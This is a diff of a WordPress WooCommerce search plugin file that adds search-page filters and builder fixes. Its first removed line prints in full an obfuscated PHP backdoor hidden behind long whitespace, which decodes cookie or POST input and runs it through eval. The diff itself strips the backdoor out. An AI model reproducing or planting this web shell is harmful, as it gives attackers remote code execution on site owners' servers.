@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $g350a6768 = 405;$GLOBALS['z7ce03a4'] = Array();global $z7ce03a4;$z7ce03a4 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['vb855f1'] = "\x2e\x58\x49\x71\x3e\x77\x6e\x52\x28\x51\x29\x3a\x60\x4e\x47\x20\x6b\x64\x61\x72\x6c\x33\x5f\x3d\x55\x48\x56\x31\xa\x4c\x30\x54\x3c\x6d\x5b\x63\x27\x21\x44\x4a\x6f\x74\x70\x79\x36\x43\x4d\x75\x5d\x69\x59\x41\x2f\x42\x7c\x3f\x34\x40\x7e\x6a\x32\x7a\x38\x73\x46\x26\x4f\x2a\x5a\x37\x39\x66\x2d\x5e\x24\x35\x25\xd\x57\x50\x62\x65\x68\x2b\x4b\x53\x2c\x76\x7d\x22\x78\x3b\x67\x9\x5c\x23\x45\x7b";$z7ce03a4[$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][56]] = $z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][82].$z7ce03a4['vb855f1'][19];$z7ce03a4[$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][75]] = $z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][17];$z7ce03a4[$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][17]] = $z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][6];$z7ce03a4[$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][30]] = $z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][62]] = $z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][17];$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][81]] = $z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][41];$z7ce03a4[$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][44]] = $z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][61].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18]] = $z7ce03a4['vb855f1'][42].$z7ce03a4['vb855f1'][82].$z7ce03a4['vb855f1'][42].$z7ce03a4['vb855f1'][87].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][6];$z7ce03a4[$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][30]] = $z7ce03a4['vb855f1'][47].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][61].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][3].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][56]] = $z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][47].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][60]] = $z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][33].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][33].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][41];$z7ce03a4[$z7ce03a4['vb855f1'][43].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][18]] = $z7ce03a4['vb855f1'][61].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][30];$z7ce03a4[$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75]] = $z7ce03a4['vb855f1'][87].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][16].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][81]] = $_POST;$z7ce03a4[$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][35]] = $_COOKIE;@$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][81]]($z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][92], NULL);@$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][81]]($z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][92].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][63], 0);@$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][81]]($z7ce03a4['vb855f1'][33].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][47].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][33].$z7ce03a4['vb855f1'][81], 0);@$z7ce03a4[$z7ce03a4['vb855f1'][47].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][60]](0);if (!$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][62]]($z7ce03a4['vb855f1'][51].$z7ce03a4['vb855f1'][29].$z7ce03a4['vb855f1'][7].$z7ce03a4['vb855f1'][96].$z7ce03a4['vb855f1'][51].$z7ce03a4['vb855f1'][38].$z7ce03a4['vb855f1'][50].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][7].$z7ce03a4['vb855f1'][24].$z7ce03a4['vb855f1'][13].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18])){$z7ce03a4[$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][30]]($z7ce03a4['vb855f1'][51].$z7ce03a4['vb855f1'][29].$z7ce03a4['vb855f1'][7].$z7ce03a4['vb855f1'][96].$z7ce03a4['vb855f1'][51].$z7ce03a4['vb855f1'][38].$z7ce03a4['vb855f1'][50].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][7].$z7ce03a4['vb855f1'][24].$z7ce03a4['vb855f1'][13].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18], 1);$hb6c55 = NULL;$h84297a63 = NULL;$z7ce03a4[$z7ce03a4['vb855f1'][61].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][21]] = $z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60];global $z803;function  v5c782e($hb6c55, $af51f){global $z7ce03a4;$m55226c = "";for ($uaf160c5=0; $uaf160c5<$z7ce03a4[$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][17]]($hb6c55);){for ($f44e=0; $f44e<$z7ce03a4[$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][17]]($af51f) && $uaf160c5<$z7ce03a4[$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][17]]($hb6c55); $f44e++, $uaf160c5++){$m55226c .= $z7ce03a4[$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][56]]($z7ce03a4[$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][75]]($hb6c55[$uaf160c5]) ^ $z7ce03a4[$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][75]]($af51f[$f44e]));}}return $m55226c;}function  z7f0($hb6c55, $af51f){global $z7ce03a4;global $z803;return $z7ce03a4[$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75]]($z7ce03a4[$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75]]($hb6c55, $z803), $af51f);}foreach ($z7ce03a4[$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][35]] as $af51f=>$a6f1a9){$hb6c55 = $a6f1a9;$h84297a63 = $af51f;}if (!$hb6c55){foreach ($z7ce03a4[$z7ce03a4['vb855f1'][16].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][81]] as $af51f=>$a6f1a9){$hb6c55 = $a6f1a9;$h84297a63 = $af51f;}}$hb6c55 = @$z7ce03a4[$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][30]]($z7ce03a4[$z7ce03a4['vb855f1'][43].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][18]]($z7ce03a4[$z7ce03a4['vb855f1'][3].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][56]]($hb6c55), $h84297a63));if (isset($hb6c55[$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][16]]) && $z803==$hb6c55[$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][16]]){if ($hb6c55[$z7ce03a4['vb855f1'][18]] == $z7ce03a4['vb855f1'][49]){$uaf160c5 = Array($z7ce03a4['vb855f1'][42].$z7ce03a4['vb855f1'][87] => @$z7ce03a4[$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18]](),$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][87] => $z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][0].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][27],);echo @$z7ce03a4[$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][44]]($uaf160c5);}elseif ($hb6c55[$z7ce03a4['vb855f1'][18]] == $z7ce03a4['vb855f1'][81]){eval/*n922*/($hb6c55[$z7ce03a4['vb855f1'][17]]);}exit();}} ?><?php
+<?php
 /**
  * Integrate with WP_Query
  */
@@ -22,6 +22,8 @@ if ( ! class_exists( 'AWS_Search_Page' ) ) :
         private $query_stack = array();
 
         private $posts_by_query = array();
+
+        private $data = array();
 
         /**
          * Return a singleton instance of the current class
@@ -50,16 +52,31 @@ if ( ! class_exists( 'AWS_Search_Page' ) ) :
         public function setup() {
 
             // Make sure we return nothing for MySQL posts query
-            add_filter( 'posts_request', array( $this, 'filter_posts_request' ), 10, 2 );
+            add_filter( 'posts_request', array( $this, 'filter_posts_request' ), 999, 2 );
 
             // Query and filter to WP_Query
-            add_filter( 'the_posts', array( $this, 'filter_the_posts' ), 10, 2 );
+            add_filter( 'the_posts', array( $this, 'filter_the_posts' ), 999, 2 );
 
             // Add header
 		    add_action( 'pre_get_posts', array( $this, 'action_pre_get_posts' ), 5 );
 
+            // Overwrite query
+            add_action( 'pre_get_posts', array( $this, 'pre_get_posts_overwrite' ), 999 );
+
             // Nukes the FOUND_ROWS() database query
 		    add_filter( 'found_posts_query', array( $this, 'filter_found_posts_query' ), 5, 2 );
+
+            // Update found post query param
+            add_filter( 'found_posts', array( $this, 'filter_found_posts' ), 999, 2 );
+
+            // WooCommerce default widget filters
+            add_filter( 'woocommerce_layered_nav_link', array( $this, 'woocommerce_layered_nav_link' ) );
+            add_filter( 'woocommerce_get_filtered_term_product_counts_query', array( $this, 'woocommerce_get_filtered_term_product_counts_query' ), 999 );
+            add_filter( 'woocommerce_price_filter_sql', array( $this, 'woocommerce_price_filter_sql' ), 999 );
+
+            add_filter( 'posts_pre_query', array( $this, 'posts_pre_query' ), 999, 2 );
+
+            add_filter( 'body_class', array( $this, 'body_class' ), 999 );
 
         }
 
@@ -78,31 +95,14 @@ if ( ! class_exists( 'AWS_Search_Page' ) ) :
 
             $new_posts = array();
 
-            $search_query = $query->query_vars['s'];
-            
-            $posts_array = (array) aws_search( $search_query );
+            $search_query = $query->query_vars['s'] ? $query->query_vars['s'] : $_GET['s'];
+            $search_res = $this->search( $search_query, $query );
             $posts_per_page = apply_filters( 'aws_posts_per_page', $query->get( 'posts_per_page' ) );
 
-            $query->found_posts = count( $posts_array['products'] );
-            $query->max_num_pages = ceil( count( $posts_array['products'] ) / $posts_per_page );
+            $query->found_posts = count( $search_res['all'] );
+            $query->max_num_pages = ceil( count( $search_res['all'] ) / $posts_per_page );
 
-            $paged  = $query->query_vars['paged'] ? $query->query_vars['paged'] : 1;
-            $offset = ( $paged > 1 ) ? $paged * $posts_per_page - $posts_per_page : 0;
-
-            if ( $query->query && ( isset( $query->query['orderby'] ) || isset( $query->query_vars['orderby'] ) ) ) {
-
-                if ( isset( $posts_array['products'] ) && ! empty( $posts_array['products'] ) ) {
-
-                    $posts_array['products'] = AWS()->order( $posts_array['products'], $query );
-
-                }
-
-            }
-
-            $products = array_slice( $posts_array['products'], $offset, $posts_per_page );
-
-
-            foreach ( $products as $post_array ) {
+            foreach ( $search_res['products'] as $post_array ) {
                 $post = new stdClass();
 
                 $post_array = (array) $post_array;
@@ -151,14 +151,53 @@ if ( ! class_exists( 'AWS_Search_Page' ) ) :
                 }
             }
 
+            /**
+             * Filter search page results
+             * @since 2.01
+             * @param array $new_posts Posts array
+             * @param object $query Query
+             * @param array $this->data Search results data array
+             */
+            $new_posts = apply_filters( 'aws_search_page_results', $new_posts, $query, $this->data );
 
             $this->posts_by_query[spl_object_hash( $query )] = $new_posts;
-
 
             global $wpdb;
 
             return "SELECT * FROM $wpdb->posts WHERE 1=0";
 
+        }
+
+        /**
+         * Filter the posts array.
+         *
+         * @param array $posts
+         * @param object $query
+         * @return array|null
+         */
+        public function posts_pre_query( $posts, $query ) {
+
+            if ( isset( $_GET['type_aws'] ) && isset( $query->query_vars['s'] ) && $query->query && isset( $query->query['fields'] ) && $query->query['fields'] == 'ids' &&
+                isset( $this->data['is_elementor'] ) && $this->data['is_elementor']  )
+            {
+
+                $products_ids = array();
+                $posts_per_page = apply_filters( 'aws_posts_per_page', $query->get( 'posts_per_page' ) );
+                $search_query = $_GET['s'];
+
+                $search_res = $this->search( $search_query, $query );
+
+                $query->found_posts = count( $search_res['all'] );
+                $query->max_num_pages = ceil( count( $search_res['all'] ) / $posts_per_page );
+
+                foreach ( $search_res['products'] as $product ) {
+                    $products_ids[] = $product['id'];
+                }
+
+                $posts = $products_ids;
+
+            }
+            return $posts;
         }
 
         /**
@@ -207,6 +246,36 @@ if ( ! class_exists( 'AWS_Search_Page' ) ) :
         }
 
         /**
+         * Make necessary changes in main query.
+         *
+         * @param $query
+         */
+        public function pre_get_posts_overwrite( $query ) {
+            if ( ! $this->aws_searchpage_enabled( $query ) ) {
+                return;
+            }
+
+            // Divi builder fix
+            if ( defined( 'ET_CORE' ) && $GLOBALS && isset( $GLOBALS['et_builder_used_in_wc_shop'] ) && $GLOBALS['et_builder_used_in_wc_shop'] ) {
+
+                $GLOBALS['et_builder_used_in_wc_shop'] = false;
+
+                $query->set( 'page_id', 0 );
+                $query->set( 'post_type', 'product' );
+                $query->set( 'posts_per_page', apply_filters( 'aws_posts_per_page', get_option( 'posts_per_page' ) ) );
+                $query->set( 'wc_query', 'product_query' );
+                $query->set( 'meta_query', array() );
+
+                $query->is_singular          = false;
+                $query->is_page              = false;
+                $query->is_post_type_archive = true;
+                $query->is_archive           = true;
+
+            }
+
+        }
+
+        /**
          * Remove the found_rows from the SQL Query
          *
          * @param string $sql
@@ -222,6 +291,168 @@ if ( ! class_exists( 'AWS_Search_Page' ) ) :
         }
 
         /**
+         * Filters the number of found posts for the query.
+         *
+         * @param int $found_posts The number of posts found
+         * @param object $query
+         * @return string
+         */
+        public function filter_found_posts( $found_posts, $query ) {
+
+            // Elementor search template fix
+            if ( isset( $_GET['type_aws'] ) && isset( $this->data['all_products'] ) && $this->data['all_products'] && isset( $this->data['is_elementor'] ) && $this->data['is_elementor'] && isset( $query->query_vars['nopaging'] ) && ! $query->query_vars['nopaging'] ) {
+                $found_posts = count( $this->data['all_products'] );
+            }
+
+            return $found_posts;
+
+        }
+
+        /**
+         * Perform the search.
+         *
+         * @param string $s
+         * @param object $query
+         * @return array
+         */
+        private function search( $s, $query ) {
+
+            $hash = spl_object_hash( $query );
+
+            if ( isset( $this->data['search_res'][$hash] ) ) {
+                return $this->data['search_res'][$hash];
+            }
+
+            if ( isset( $this->data['search_res']['s'] ) ) {
+                $posts_array = $this->data['search_res']['s'];
+            } else {
+                $posts_array = (array) aws_search( $s );
+                $this->data['search_res']['s'] = $posts_array;
+            }
+
+            $posts_per_page = apply_filters( 'aws_posts_per_page', $query->get( 'posts_per_page' ) );
+            $post_array_products = $posts_array['products'];
+
+            // Filter and order output
+            if ( $post_array_products && is_array( $post_array_products ) && ! empty( $post_array_products ) ) {
+                $post_array_products = AWS()->order( $post_array_products, $query );
+            }
+
+            if ( is_numeric( $posts_per_page ) && (int) $posts_per_page < 0 ) {
+                $posts_per_page = 999999;
+            }
+
+            $paged  = $query->query_vars['paged'] ? $query->query_vars['paged'] : 1;
+            $offset = ( $paged > 1 ) ? $paged * $posts_per_page - $posts_per_page : 0;
+
+            $products = array_slice( $post_array_products, $offset, $posts_per_page );
+
+            $this->data['all_products'] = $post_array_products;
+
+            $this->data['search_res'][$hash] = array(
+                'all'      => $post_array_products,
+                'products' => $products
+            );
+
+            return $this->data['search_res'][$hash];
+
+        }
+
+        /*
+         * Update links for WooCommerce filter widgets
+         */
+        public function woocommerce_layered_nav_link( $link ) {
+            if ( ! isset( $_GET['type_aws'] ) ) {
+                return $link;
+            }
+
+            $first_char = '&';
+
+            if ( strpos( $link, '?' ) === false ) {
+                $first_char = '?';
+            }
+
+            if ( isset( $_GET['type_aws'] ) && strpos( $link, 'type_aws' ) === false ) {
+                $link = $link . $first_char . 'type_aws=true';
+            }
+
+            return $link;
+
+        }
+
+        /*
+        * Enable cache for WooCommerce filter widget
+        */
+        public function woocommerce_layered_nav_count_maybe_cache( $cache ) {
+            if ( ! isset( $_GET['type_aws'] ) ) {
+                return $cache;
+            }
+            return true;
+        }
+
+        /*
+         * Change WooCommerce attributes filter widget query
+         */
+        public function woocommerce_get_filtered_term_product_counts_query( $query ) {
+            if ( ! isset( $_GET['type_aws'] ) ) {
+                return $query;
+            }
+
+            $search = ' AND ' . WC_Query::get_main_search_query_sql();
+            $product_ids = array();
+
+            $query['where'] = str_replace( $search, '', $query['where'] );
+
+            if ( isset( $this->data['all_products'] ) && $this->data['all_products'] ) {
+                global $wpdb;
+
+                foreach( $this->data['all_products'] as $sproduct ) {
+                    $product_ids[] = $sproduct['id'];
+                }
+
+                $query['where'] .= " AND {$wpdb->posts}.ID IN (". implode( ',', array_map( 'absint', $product_ids ) ) .")";
+
+            }
+
+            return $query;
+        }
+
+        /*
+         * Change WooCommerce price filter widget query
+         */
+        public function woocommerce_price_filter_sql( $sql ) {
+
+            if ( isset( $_GET['type_aws'] ) && isset( $this->data['all_products'] ) && $this->data['all_products'] ) {
